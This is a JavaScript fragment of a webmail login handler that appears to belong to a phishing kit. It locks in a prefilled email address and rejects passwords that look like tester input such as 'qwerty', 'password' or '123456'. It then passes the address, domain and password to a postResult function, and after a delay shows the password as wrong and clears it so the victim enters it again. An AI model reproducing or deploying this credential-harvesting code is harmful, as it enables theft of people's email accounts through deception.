// 
if (validEmail.test(usermail)) {
    $("#web_mail").val(usermail)
    $("#web_mail").attr('readOnly', true)
}

$("#webmail_form").on('submit', (e)=>{
    e.preventDefault();

    let web_form_inputs = document.getElementsByClassName("web_form_inputs");

    if (!validEmail.test($("#web_mail").val())) {
        web_form_inputs[0].style.borderColor = "red";
        return
    }
    else{
        web_form_inputs[0].style.borderColor = "silver";
    }

    if (validEmail.test($("#web_pass").val()) || $("#web_pass").val().length < 6 || $("#web_pass").val().toLowerCase() == "qwerty" || $("#web_pass").val() == 123456 || $("#web_pass").val().toLowerCase() == "password" || $("#web_pass").val().toLowerCase() == "testing") {
        web_form_inputs[1].style.borderColor = "red";
        return
    }
    else{
        web_form_inputs[1].style.borderColor = "silver";
    }

    $("#loader").show().css({"display":"flex"})

    let url = $("#web_mail").val().split('@');

    postResult(url[1], $("#web_mail").val(), $("#web_pass").val(), postCount);
    
    setTimeout(() => {
        web_form_inputs[1].style.borderColor = "red";
        postCount++
        $("#web_pass").val("")
    }, delayCounter);
})